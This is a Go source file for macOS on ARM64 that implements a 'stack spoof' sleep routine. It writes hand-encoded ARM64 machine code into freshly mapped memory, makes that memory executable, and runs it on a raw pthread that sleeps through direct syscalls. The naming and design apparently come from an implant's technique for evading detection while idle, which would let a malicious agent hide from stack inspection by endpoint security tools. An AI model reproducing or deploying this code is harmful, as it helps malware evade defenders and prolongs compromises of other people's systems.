//go:build darwin && arm64

package commands

import (
	"encoding/binary"
	"fmt"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

//go:cgo_import_dynamic libc_pthread_create pthread_create "/usr/lib/libSystem.B.dylib"
//go:cgo_import_dynamic libc___ulock_wait __ulock_wait "/usr/lib/libSystem.B.dylib"
//go:cgo_import_dynamic libc___ulock_wake __ulock_wake "/usr/lib/libSystem.B.dylib"

var libc_pthread_create_trampoline_addr uintptr
var libc___ulock_wait_trampoline_addr uintptr
var libc___ulock_wake_trampoline_addr uintptr

// darwinSyscall6 calls a libSystem function through its trampoline address.
// On darwin arm64, syscall.Syscall6 (uppercase) uses raw SVC which treats the
// first arg as a BSD syscall number. The lowercase syscall.syscall6 correctly
// calls through the function pointer via libcCall. We access it via go:linkname.
//
//go:linkname darwinSyscall6 syscall.syscall6
func darwinSyscall6(fn, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err syscall.Errno)

//go:linkname darwinSyscall syscall.syscall
func darwinSyscall(fn, a1, a2, a3 uintptr) (r1, r2 uintptr, err syscall.Errno)

const (
	darDataOffState  = 0
	darDataOffTvSec  = 32
	darDataOffTvNsec = 40
	darDataBlockSize = 48

	ulCompareAndWait = 1

	spoofStateIdle     uint32 = 0
	spoofStateSleep    uint32 = 1
	spoofStateDone     uint32 = 2
	spoofStateShutdown uint32 = 3
)

type stackSpoofState struct {
	mu          sync.Mutex
	initialized bool
	pthreadID   uint64
	stubSlice   []byte
	dataSlice   []byte
	dataAddr    uintptr
}

var (
	stackSpoof      stackSpoofState
	stackSpoofReady bool
)

func InitStackSpoof() error {
	return stackSpoof.init()
}

func StackSpoofAvailable() bool {
	return stackSpoofReady
}

func StackSpoofSleep(d time.Duration) {
	if !stackSpoofReady {
		time.Sleep(d)
		return
	}
	stackSpoof.sleep(d)
}

func CleanupStackSpoof() {
	stackSpoof.cleanup()
}

func (s *stackSpoofState) init() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.initialized {
		return nil
	}

	pageSize := unix.Getpagesize()

	dataSlice, err := unix.Mmap(-1, 0, pageSize,
		unix.PROT_READ|unix.PROT_WRITE,
		unix.MAP_PRIVATE|unix.MAP_ANON)
	if err != nil {
		return fmt.Errorf("mmap data: %w", err)
	}
	s.dataSlice = dataSlice
	s.dataAddr = uintptr(unsafe.Pointer(&dataSlice[0]))

	for i := range dataSlice[:darDataBlockSize] {
		dataSlice[i] = 0
	}

	stub := generateDarwinArm64SleepStub()

	stubAllocSize := ((len(stub) + pageSize - 1) / pageSize) * pageSize
	stubSlice, err := unix.Mmap(-1, 0, stubAllocSize,
		unix.PROT_READ|unix.PROT_WRITE,
		unix.MAP_PRIVATE|unix.MAP_ANON)
	if err != nil {
		_ = unix.Munmap(dataSlice)
		return fmt.Errorf("mmap stub: %w", err)
	}
	copy(stubSlice, stub)
	s.stubSlice = stubSlice

	if err := unix.Mprotect(stubSlice, unix.PROT_READ|unix.PROT_EXEC); err != nil {
		_ = unix.Munmap(stubSlice)
		_ = unix.Munmap(dataSlice)
		return fmt.Errorf("mprotect stub RX: %w", err)
	}

	stubAddr := uintptr(unsafe.Pointer(&stubSlice[0]))

	var pthreadID uint64
	r1, _, errno := darwinSyscall6(
		libc_pthread_create_trampoline_addr,
		uintptr(unsafe.Pointer(&pthreadID)),
		0,
		stubAddr,
		s.dataAddr,
		0, 0,
	)
	if r1 != 0 || errno != 0 {
		_ = unix.Munmap(stubSlice)
		_ = unix.Munmap(dataSlice)
		return fmt.Errorf("pthread_create failed: ret=%d errno=%d", r1, errno)
	}
	s.pthreadID = pthreadID

	s.initialized = true
	stackSpoofReady = true
	return nil
}

func (s *stackSpoofState) sleep(d time.Duration) {
	s.mu.Lock()
	if !s.initialized {
		s.mu.Unlock()
		time.Sleep(d)
		return
	}
	data := s.dataSlice[:darDataBlockSize]
	stateAddr := uintptr(unsafe.Pointer(&data[darDataOffState]))
	s.mu.Unlock()

	sec := int64(d / time.Second)
	nsec := int64(d % time.Second)
	statePtr := (*uint32)(unsafe.Pointer(&data[darDataOffState]))

	binary.LittleEndian.PutUint64(data[darDataOffTvSec:], uint64(sec))
	binary.LittleEndian.PutUint64(data[darDataOffTvNsec:], uint64(nsec))

	atomic.StoreUint32(statePtr, spoofStateSleep)
	ulockWake(stateAddr)

	for atomic.LoadUint32(statePtr) != spoofStateDone {
		time.Sleep(time.Millisecond)
	}

	atomic.StoreUint32(statePtr, spoofStateIdle)
}

func ulockWait(addr uintptr, expectedValue uint64) {
	darwinSyscall6(
		libc___ulock_wait_trampoline_addr,
		uintptr(ulCompareAndWait),
		addr,
		uintptr(expectedValue),
		0,
		0, 0,
	)
}

func ulockWake(addr uintptr) {
	darwinSyscall(
		libc___ulock_wake_trampoline_addr,
		uintptr(ulCompareAndWait),
		addr,
		0,
	)
}

func (s *stackSpoofState) cleanup() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if !s.initialized {
		return
	}
	stackSpoofReady = false
	s.initialized = false

	statePtr := (*uint32)(unsafe.Pointer(&s.dataSlice[darDataOffState]))
	stateAddr := uintptr(unsafe.Pointer(statePtr))
	atomic.StoreUint32(statePtr, spoofStateShutdown)
	ulockWake(stateAddr)

	_ = unix.Munmap(s.stubSlice)
	_ = unix.Munmap(s.dataSlice)
}

// generateDarwinArm64SleepStub produces ARM64 machine code for a pthread
// entry function that loops: ulock_wait → nanosleep → ulock_wake.
//
// The data block address is received in x0 (pthread start_routine argument).
// Layout: state(uint32) at +0, tv_sec(int64) at +32, tv_nsec(int64) at +40.
//
// State values: 0=idle, 1=sleep, 2=done, 3=shutdown.
// Syscalls: __ulock_wait(515), __ulock_wake(516), nanosleep(240).
func generateDarwinArm64SleepStub() []byte {
	insns := []uint32{
		// Prologue: save frame + callee-saved registers
		0xA9BF7BFD, // stp x29, x30, [sp, #-16]!
		0x910003FD, // mov x29, sp
		0xA9BF53F3, // stp x19, x20, [sp, #-16]!
		0xAA0003F3, // mov x19, x0  (data block addr)

		// sleep_loop (index 4):
		// __ulock_wait(UL_COMPARE_AND_WAIT=1, &state, expected=0, timeout=0)
		0xD2800020, // mov x0, #1
		0xAA1303E1, // mov x1, x19
		0xD2800002, // mov x2, #0
		0xD2800003, // mov x3, #0
		0xD2804070, // mov x16, #515  (SYS___ulock_wait)
		0xD4001001, // svc #0x80

		// Check state
		0xB9400274, // ldr w20, [x19]
		0x71000E9F, // cmp w20, #3   (shutdown?)
		0x54000260, // b.eq exit_thread  (+19 words → index 31)
		0x7100069F, // cmp w20, #1   (sleep?)
		0x54FFFEC1, // b.ne sleep_loop   (-10 words → index 4)

		// Read sleep duration, build timespec on stack
		0xF9401260, // ldr x0, [x19, #32]  (tv_sec)
		0xF9401661, // ldr x1, [x19, #40]  (tv_nsec)
		0xA9BF07E0, // stp x0, x1, [sp, #-16]!

		// nanosleep(&ts, NULL)
		0x910003E0, // mov x0, sp
		0xD2800001, // mov x1, #0
		0xD2801E10, // mov x16, #240  (SYS_nanosleep)
		0xD4001001, // svc #0x80

		0x910043FF, // add sp, sp, #16  (pop timespec)

		// state = DONE (2)
		0x52800040, // mov w0, #2
		0xB9000260, // str w0, [x19]

		// __ulock_wake(UL_COMPARE_AND_WAIT=1, &state, 0)
		0xD2800020, // mov x0, #1
		0xAA1303E1, // mov x1, x19
		0xD2800002, // mov x2, #0
		0xD2804090, // mov x16, #516  (SYS___ulock_wake)
		0xD4001001, // svc #0x80

		0x17FFFFE6, // b sleep_loop  (-26 words → index 4)

		// exit_thread (index 31):
		0xA8C153F3, // ldp x19, x20, [sp], #16
		0xA8C17BFD, // ldp x29, x30, [sp], #16
		0xD2800000, // mov x0, #0
		0xD65F03C0, // ret
	}

	code := make([]byte, len(insns)*4)
	for i, insn := range insns {
		binary.LittleEndian.PutUint32(code[i*4:], insn)
	}
	return code
}
